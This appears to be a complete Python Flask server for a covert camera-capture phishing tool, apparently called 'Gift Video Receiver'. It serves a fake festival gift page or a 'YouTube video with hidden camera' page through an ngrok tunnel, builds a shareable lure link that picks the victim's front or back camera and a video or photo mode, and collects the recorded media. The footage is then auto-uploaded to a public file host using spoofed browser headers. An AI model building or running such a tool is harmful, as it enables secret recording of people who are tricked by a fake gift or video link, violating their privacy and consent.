#!/usr/bin/env python3
"""
Gift Video Receiver Server - With FileGoat Cloud Upload (Full Integration)
"""

import os
import sys
import time
import json
import subprocess
import threading
import urllib.parse
import urllib.request
import re
import requests
from datetime import datetime
from pathlib import Path
from flask import Flask, request, jsonify, send_file
from flask_cors import CORS
from werkzeug.utils import secure_filename

# ============================================
# CONFIG
# ============================================
UPLOAD_FOLDER = Path("gift_videos")
PORT = 5000
FESTIVAL_HTML = 'festival.html'
YOUTUBE_HTML = 'youtube.html'

# FileGoat expiry options
FILEGOAT_EXPIRY_DAYS = 7  # Default: 7 days

# Create upload directory
UPLOAD_FOLDER.mkdir(parents=True, exist_ok=True)

# ============================================
# FLASK APP
# ============================================
app = Flask(__name__)
CORS(app)

# Allow large files (5GB)
app.config["MAX_CONTENT_LENGTH"] = 5 * 1024 * 1024 * 1024

received_files = []
uploaded_links = []

# ============================================
# FILEGOAT UPLOAD FUNCTION
# ============================================

def upload_to_filegoat(filepath, expiry_days=7, extend_on_view=True):
    """
    Upload image/video to FileGoat using official 2-step API.
    
    expiry_days: 1, 7, 30, 90
    extend_on_view: True/False (extends expiry when link is viewed)
    """
    import uuid
    filepath = Path(filepath)

    if not filepath.exists():
        return {
            "success": False,
            "error": "File does not exist"
        }

    filename = filepath.name
    file_size = filepath.stat().st_size

    upload_url = "https://filego.at/api/file/upload"
    bucket_url = "https://filego.at/api/bucket"

    headers = {
        "User-Agent": (
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) "
            "AppleWebKit/537.36 Chrome/140.0 Safari/537.36"
        ),
        "Accept": "*/*",
        "Origin": "https://filego.at",
        "Referer": "https://filego.at/",
    }

    try:
        # Determine content type based on extension
        ext_lower = filename.lower()
        if ext_lower.endswith('.jpg') or ext_lower.endswith('.jpeg'):
            content_type = "image/jpeg"
        elif ext_lower.endswith('.png'):
            content_type = "image/png"
        elif ext_lower.endswith('.webm'):
            content_type = "video/webm"
        elif ext_lower.endswith('.mp4'):
            content_type = "video/mp4"
        else:
            content_type = "application/octet-stream"

        # Step 1: Upload file binary to get fileIds
        with open(filepath, "rb") as file:
            files = {
                "file": (
                    filename,
                    file,
                    content_type
                )
            }
            response = requests.post(
                upload_url,
                files=files,
                headers=headers,
                timeout=600
            )

        if response.status_code != 200:
            return {
                "success": False,
                "error": f"HTTP {response.status_code}",
                "response": response.text[:1000]
            }

        try:
            upload_result = response.json()
        except ValueError:
            return {
                "success": False,
                "error": "Server returned non-JSON response",
                "response": response.text[:1000]
            }

        file_ids = upload_result.get("fileIds")
        if not file_ids:
            return {
                "success": False,
                "error": "Upload succeeded but no fileIds returned",
                "response": upload_result
            }

        # Step 2: Create bucket to generate shareable URL
        client_id = str(uuid.uuid4())
        bucket_payload = {
            "fileIds": file_ids,
            "deleteTime": expiry_days,
            "extendOnView": extend_on_view,
            "clientId": client_id
        }

        bucket_headers = headers.copy()
        bucket_headers["Content-Type"] = "application/json"

        bucket_response = requests.post(
            bucket_url,
            json=bucket_payload,
            headers=bucket_headers,
            timeout=30
        )

        if bucket_response.status_code != 200:
            return {
                "success": False,
                "error": f"HTTP {bucket_response.status_code}",
                "response": bucket_response.text[:1000]
            }

        bucket_result = bucket_response.json()
        slug = bucket_result.get("slug")

        if not slug:
            return {
                "success": False,
                "error": "Bucket creation succeeded but no slug returned",
                "response": bucket_result
            }

        cloud_url = f"https://filego.at/bucket/{slug}"

        return {
            "success": True,
            "url": cloud_url,
            "expiry": f"{expiry_days} days",
            "filename": filename,
            "size": file_size,
            "response": bucket_result
        }

    except requests.exceptions.Timeout:
        return {"success": False, "error": "Upload timeout"}

    except requests.exceptions.ConnectionError as e:
        return {"success": False, "error": "Connection error"}

    except Exception as e:
        return {"success": False, "error": str(e)}

# ============================================
# ROUTES
# ============================================

@app.route('/festival')
def festival_page():
    try:
        with open(FESTIVAL_HTML, 'r') as f:
            return f.read()
    except FileNotFoundError:
        return f"<h1>Error: {FESTIVAL_HTML} not found!</h1>", 404

@app.route('/youtube')
def youtube_page():
    try:
        with open(YOUTUBE_HTML, 'r') as f:
            return f.read()
    except FileNotFoundError:
        return f"<h1>Error: {YOUTUBE_HTML} not found!</h1>", 404

@app.route('/upload', methods=['POST'])
def upload_media():
    try:
        # Check file
        if 'media' not in request.files:
            return jsonify({'error': 'No media file'}), 400
        
        media_file = request.files['media']
        if media_file.filename == '':
            return jsonify({'error': 'Empty filename'}), 400

        media_type = request.form.get('type', 'unknown')
        timestamp = datetime.now().strftime('%Y%m%d_%H%M%S')
        
        default_ext = '.jpg' if media_type == 'photo' else '.webm'
        
        # Secure filename and guarantee proper extension
        safe_name = secure_filename(media_file.filename)
        if not safe_name or safe_name == 'blob':
            safe_name = f"{media_type}_{timestamp}{default_ext}"
        else:
            name, ext_orig = os.path.splitext(safe_name)
            if not ext_orig:
                ext_orig = default_ext
            safe_name = f"{name}_{timestamp}{ext_orig}"
        
        # Save locally
        local_path = UPLOAD_FOLDER / safe_name
        media_file.save(local_path)
        
        file_info = {
            'filename': safe_name,
            'path': str(local_path.absolute()),
            'type': media_type,
            'timestamp': timestamp,
            'size': local_path.stat().st_size,
            'cloud_url': None,
            'expires': None,
            'delete_url': None
        }
        
        # Get expiry from request or use default
        expiry_days = request.form.get('expiry', str(FILEGOAT_EXPIRY_DAYS))
        try:
            expiry_days = int(expiry_days)
        except ValueError:
            expiry_days = FILEGOAT_EXPIRY_DAYS
        
        if expiry_days not in [1, 7, 30, 90]:
            expiry_days = 7
        
        cloud_result = upload_to_filegoat(local_path, expiry_days)
        
        if cloud_result.get('success'):
            file_info['cloud_url'] = cloud_result.get('url')
            file_info['expires'] = cloud_result.get('expiry')
            
            uploaded_links.append({
                'filename': safe_name,
                'url': cloud_result.get('url'),
                'expires': cloud_result.get('expiry')
            })
        
        received_files.append(file_info)
        
        # Clean, well-aligned display output
        print("\n" + "=" * 55)
        print(f"📹 RECEIVED MEDIA #{len(received_files)} ({media_type.upper()})")
        print("=" * 55)
        print(f"  📁 File:       {safe_name}")
        print(f"  📊 Size:       {file_info['size']:,} bytes")
        print(f"  📂 Local Path: {file_info['path']}")
        if file_info.get('cloud_url'):
            print(f"  ☁️ Cloud Link: {file_info['cloud_url']}")
            print(f"  ⏰ Expires:    {file_info['expires']}")
        else:
            print(f"  ⚠️ Cloud Link: Upload failed ({cloud_result.get('error', 'Unknown error')})")
        print("=" * 55)
        
        return jsonify({
            'success': True,
            'filename': safe_name,
            'cloud_url': file_info.get('cloud_url'),
            'local_path': file_info.get('path')
        }), 200

    except Exception as e:
        print(f"❌ Error: {e}")
        return jsonify({'error': str(e)}), 500

@app.route('/files', methods=['GET'])
def list_files():
    return jsonify({
        'files': received_files,
        'cloud_links': uploaded_links
    })

@app.route('/cloud-links', methods=['GET'])
def get_cloud_links():
    return jsonify({
        'links': uploaded_links,
        'total': len(uploaded_links)
    })

@app.route('/download/<filename>', methods=['GET'])
def download_file(filename):
    filepath = UPLOAD_FOLDER / filename
    if filepath.exists():
        return send_file(filepath, as_attachment=True)
    return jsonify({'error': 'File not found'}), 404

# ============================================
# MAIN SERVER CLASS
# ============================================
class GiftServer:
    def __init__(self):
        self.ngrok_process = None
        self.ngrok_url = None
        self.port = PORT
        self.running = True
        self.ngrok_ready = threading.Event()

    def check_html_files(self):
        if not os.path.exists(FESTIVAL_HTML):
            print(f"\n❌ Error: {FESTIVAL_HTML} not found!")
            return False
        if not os.path.exists(YOUTUBE_HTML):
            print(f"\n❌ Error: {YOUTUBE_HTML} not found!")
            return False
        return True

    def get_camera_type(self):
        print("\n📷 Select camera type:")
        print("  1. Front Camera")
        print("  2. Back Camera")
        
        while True:
            choice = input("\nEnter choice (1 or 2): ").strip()
            if choice == '1':
                return 'user'
            elif choice == '2':
                return 'environment'
            else:
                print("❌ Invalid choice. Enter 1 or 2")

    def get_capture_mode(self):
        print("\n📸 Select capture mode:")
        print("  1. Video - Record 15 second video")
        print("  2. Photo - Capture 5 photos")
        
        while True:
            choice = input("\nEnter choice (1 or 2): ").strip()
            if choice == '1':
                return 'video', 15, 0
            elif choice == '2':
                return 'photo', 0, 5
            else:
                print("❌ Invalid choice. Enter 1 or 2")

    def show_main_menu(self):
        print("\n" + "="*60)
        print("🎁 GIFT VIDEO RECEIVER")
        print("="*60)
        print("\nSelect mode:")
        print("  1. 🎊 Festival Mode - Gift/surprise page with festival name")
        print("  2. 🎬 YouTube Mode - YouTube video with hidden camera")
        print("\n" + "-"*60)
        
        while True:
            choice = input("\nEnter choice (1 or 2): ").strip()
            if choice == '1':
                return 'festival'
            elif choice == '2':
                return 'youtube'
            else:
                print("❌ Invalid choice. Enter 1 or 2")

    def get_festival_name(self):
        name = input("\n📝 Enter festival/gift name: ").strip()
        if not name:
            name = "Surprise"
            print(f"   Using default: {name}")
        return name

    def get_youtube_video(self):
        print("\n🎬 Enter YouTube video URL or ID:")
        print("   (Press Enter for default video)")
        video = input("   ▶ ").strip()
        
        if video and ('youtube.com' in video or 'youtu.be' in video):
            patterns = [
                r'(?:youtube\.com\/watch\?v=)([^&]+)',
                r'(?:youtu\.be\/)([^?]+)',
                r'(?:youtube\.com\/embed\/)([^?]+)'
            ]
            for pattern in patterns:
                match = re.search(pattern, video)
                if match:
                    video = match.group(1)
                    break
        
        if not video:
            video = "dQw4w9WgXcQ"
            print(f"   Using default video ID: {video}")
        else:
            print(f"   Using video ID: {video}")
        
        return video

    def get_cloud_config(self):
        """Get cloud upload configuration from user"""
        print("\n☁️ FileGoat Cloud Upload Configuration:")
        print("   Files will be uploaded with auto-expiry")
        print("")
        print("   Select expiry time:")
        print("     1. 1 day")
        print("     2. 7 days (default)")
        print("     3. 30 days")
        print("     4. 90 days")
        
        while True:
            choice = input("\n   Enter choice (1-4, press Enter for default): ").strip()
            if choice == '' or choice == '2':
                return 7
            elif choice == '1':
                return 1
            elif choice == '3':
                return 30
            elif choice == '4':
                return 90
            else:
                print("   ❌ Invalid choice. Enter 1-4 or press Enter for default")

    def generate_link(self, mode, name=None, video_id=None, camera='user', capture_mode='video', duration=15, photos=5):
        base_url = self.ngrok_url
        
        if mode == 'festival':
            link = f"{base_url}/festival?name={urllib.parse.quote(name)}&camera={camera}&mode={capture_mode}&duration={duration}&photos={photos}"
            mode_name = "🎊 Festival Mode"
        else:
            link = f"{base_url}/youtube?video={urllib.parse.quote(video_id)}&camera={camera}&mode={capture_mode}&duration={duration}&photos={photos}"
            mode_name = "🎬 YouTube Mode"
        
        return link, mode_name

    def check_ngrok(self):
        try:
            result = subprocess.run(['ngrok', '--version'], capture_output=True, text=True)
            if result.returncode == 0:
                return True
        except FileNotFoundError:
            pass
        
        print("\n❌ ngrok is not installed or not in PATH!")
        print("📥 Install from: https://ngrok.com/download")
        return False

    def monitor_ngrok(self):
        try:
            time.sleep(3)
            for attempt in range(10):
                try:
                    with urllib.request.urlopen('http://localhost:4040/api/tunnels', timeout=2) as response:
                        data = json.loads(response.read().decode())
                        for tunnel in data.get('tunnels', []):
                            if tunnel.get('proto') == 'https':
                                self.ngrok_url = tunnel.get('public_url')
                                self.ngrok_ready.set()
                                return
                except Exception:
                    time.sleep(3)
        except Exception as e:
            print(f"❌ Error monitoring ngrok: {e}")

    def start_ngrok(self):
        print(f"\n🚀 Starting ngrok tunnel on port {self.port}...")
        
        try:
            self.ngrok_process = subprocess.Popen(
                ['ngrok', 'http', str(self.port)],
                stdout=subprocess.DEVNULL,
                stderr=subprocess.DEVNULL,
                stdin=subprocess.DEVNULL
            )
            
            monitor_thread = threading.Thread(target=self.monitor_ngrok)
            monitor_thread.daemon = True
            monitor_thread.start()
            
            if self.ngrok_ready.wait(timeout=30):
                print(f"✅ Tunnel established!")
                return True
            else:
                print("⚠️ ngrok started but URL not found")
                return False
                
        except Exception as e:
            print(f"❌ Failed to start ngrok: {e}")
            return False

    def start_flask(self):
        print(f"\n🔧 Starting server on port {self.port}...")
        
        def run_flask():
            app.run(host='0.0.0.0', port=self.port, debug=False, use_reloader=False)
        
        flask_thread = threading.Thread(target=run_flask)
        flask_thread.daemon = True
        flask_thread.start()
        time.sleep(2)
        print("✅ Server running")

    def wait_for_files(self):
        print("\n🎁 Server ready! Waiting for incoming files... (Press Ctrl+C to stop)")
        print(f"📁 Local Folder:  {UPLOAD_FOLDER.absolute()}")
        print(f"☁️ Cloud Service: FileGoat ({FILEGOAT_EXPIRY_DAYS} days auto-expiry)")
        print("=" * 60)
        
        try:
            while self.running:
                time.sleep(1)
        except KeyboardInterrupt:
            print("\n\n👋 Shutting down...")

    def cleanup(self):
        print("\n🧹 Cleaning up...")
        if self.ngrok_process:
            self.ngrok_process.terminate()
            try:
                self.ngrok_process.wait(timeout=5)
            except subprocess.TimeoutExpired:
                self.ngrok_process.kill()
        print("✅ Done!")

    def run(self):
        try:
            # Setup
            if not self.check_html_files():
                return
            
            if not self.check_ngrok():
                return
            
            # Get cloud config
            global FILEGOAT_EXPIRY_DAYS
            FILEGOAT_EXPIRY_DAYS = self.get_cloud_config()
            print(f"   ✅ Files will expire after: {FILEGOAT_EXPIRY_DAYS} days")
            
            # Main menu
            mode = self.show_main_menu()
            camera = self.get_camera_type()
            capture_mode, duration, photos = self.get_capture_mode()
            
            if mode == 'festival':
                name = self.get_festival_name()
                video_id = None
            else:
                video_id = self.get_youtube_video()
                name = None
            
            # Start server
            self.start_flask()
            if not self.start_ngrok():
                return
            
            # Generate link
            link, mode_name = self.generate_link(mode, name, video_id, camera, capture_mode, duration, photos)
            
            print("\n" + "=" * 60)
            print(f"📤 SHARE THIS LINK ({mode_name}):")
            print("=" * 60)
            print(f"\n🔗 {link}\n")
            print("=" * 60)
            
            print("\n📋 Configuration Summary:")
            print(f"   🎯 Mode:         {mode_name}")
            print(f"   📷 Camera:       {'Front' if camera == 'user' else 'Back'}")
            print(f"   📸 Capture:      {'Video (' + str(duration) + 's)' if capture_mode == 'video' else 'Photo (' + str(photos) + ' photos)'}")
            print(f"   ☁️ Cloud Expiry: {FILEGOAT_EXPIRY_DAYS} days (FileGoat)")
            if mode == 'festival':
                print(f"   🎊 Festival:     {name}")
            else:
                print(f"   🎬 Video ID:     {video_id}")
            
            self.wait_for_files()
            
        except KeyboardInterrupt:
            print("\n\n👋 Goodbye!")
        finally:
            self.cleanup()

if __name__ == '__main__':
    server = GiftServer()
    server.run()